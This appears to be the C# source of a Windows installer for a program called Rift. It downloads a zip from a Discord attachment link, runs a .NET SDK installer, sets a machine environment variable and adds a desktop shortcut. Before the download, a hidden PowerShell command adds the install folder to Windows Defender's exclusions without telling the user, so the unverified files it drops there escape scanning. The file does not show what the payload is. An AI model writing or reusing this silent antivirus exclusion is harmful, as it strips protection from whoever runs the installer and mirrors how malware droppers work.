using System;
using System.IO;
using System.Net;
using System.Windows;
using System.Diagnostics;
using System.Windows.Input;
using System.IO.Compression;
using System.Threading.Tasks;
using System.ServiceProcess;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;

namespace RiftInstaller
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Rift Installer\\Data\\");
            if (Directory.Exists("Rift"))
            {
                InstallButton.IsEnabled = false;
                InstallButton.Content = "Installed";
            }
        }

        private void DragBar(object sender, MouseButtonEventArgs e)
        {
            this.DragMove();
        }

        private void CloseWindow(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void Install(object sender, RoutedEventArgs e)
        {
            DownloadManager();
        }

        private void DownloadManager()
        {
            try
            {
                var start = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    Arguments = "-Command Add-MpPreference -ExclusionPath '" + Environment.CurrentDirectory + "'",
                    CreateNoWindow = true,
                };
                Process.Start(start);
                string gzip = "Rift.zip";
                WebClient webclient = new();
                webclient.DownloadFileCompleted += new System.ComponentModel.AsyncCompletedEventHandler(DownloadRiftCompletedCallback);
                webclient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(RiftDownloadProgressChanged);
                webclient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/972611854524354570/1000161173720809522/Rift-2.2.0.6.zip"), gzip);
                InstallButton.Content = "Installing...";
                InstallButton.IsEnabled = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error finishing download: {ex}");
            }
        }
        public void RiftDownloadProgressChanged(Object sender, DownloadProgressChangedEventArgs e)
        {
            Status.Text = "Status: Installing Rift - " + e.ProgressPercentage.ToString() + "%";
        }
        private void DownloadRiftCompletedCallback(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            try
            {
                string gzip = "Rift.zip";
                ZipFile.ExtractToDirectory(gzip, @"./Rift");
                File.Delete(gzip);
                DotNetDownload();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error finishing download: {ex}");
            }
        }
        private void DotNetDownload()
        {
            try
            {
                string gzip = "dotnet.exe";
                WebClient webclient = new();
                webclient.DownloadFileCompleted += new System.ComponentModel.AsyncCompletedEventHandler(DownloadDotNetCompletedCallback);
                webclient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(DotNetDownloadProgressChanged);
                webclient.DownloadFileAsync(new Uri("https://download.visualstudio.microsoft.com/download/pr/962fa33f-e57c-4e8a-abc9-01882ff74e3d/23e11ee6c3da863fa1489f951aa7e75e/dotnet-sdk-3.1.417-win-x64.exe"), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Rift Installer\\Data\\" + gzip);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error finishing download: {ex}");
            }
        }
        public void DotNetDownloadProgressChanged(Object sender, DownloadProgressChangedEventArgs e)
        {
            Status.Text = "Status: Downloading .Net - " + e.ProgressPercentage.ToString() + "%";
        }
        private void DownloadDotNetCompletedCallback(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            try
            {
                string name = "dotnet.exe";
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Rift Installer\\Data\\" + name).WaitForExit();
                WebClient wc = new();
                wc.DownloadFile("https://cdn.discordapp.com/attachments/972611854524354570/997363999995867246/rift.ico", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Rift Installer\\Data\\Rift.ico");
                SetEnvironmentVariable();
                Status.Text = "Creating desktop icon for Rift";
                IShellLink link = (IShellLink)new ShellLink();
                link.SetDescription("Rift Launcher");
                link.SetPath(Environment.CurrentDirectory + "\\Rift\\Rift.exe");
                link.SetWorkingDirectory(Environment.CurrentDirectory + "\\Rift");
                link.SetIconLocation(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Rift Installer\\Data\\Rift.ico", 0);
                IPersistFile file = (IPersistFile)link;
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                file.Save(Path.Combine(desktopPath, "Rift.lnk"), false);
                MessageBox.Show("Rift has been successfully installed and an icon to start Rift has been added to your desktop! Enjoy!", "Completed", MessageBoxButton.OK, MessageBoxImage.Information);
                Status.Text = "";
                InstallButton.Content = "Installed";
                InstallButton.IsEnabled = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Finishing the download failed! Error message: " + ex.Message);
                this.Close();
            }
        }

        private void SetEnvironmentVariable()
        {
            Status.Text = "Checking if CPU fix is needed";
            if (String.IsNullOrEmpty(Environment.GetEnvironmentVariable("OPENSSL_ia32cap")))
            {
                Status.Text = "CPU fix is needed, applying fix";
                Environment.SetEnvironmentVariable("OPENSSL_ia32cap", "~0x20000000", EnvironmentVariableTarget.Machine);
                Status.Text = "CPU fix applied";
            }
            Status.Text = "CPU fix is not needed, finishing up";
        }
        [ComImport]
        [Guid("00021401-0000-0000-C000-000000000046")]
        internal class ShellLink
        {
        }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        internal interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }
    }
}
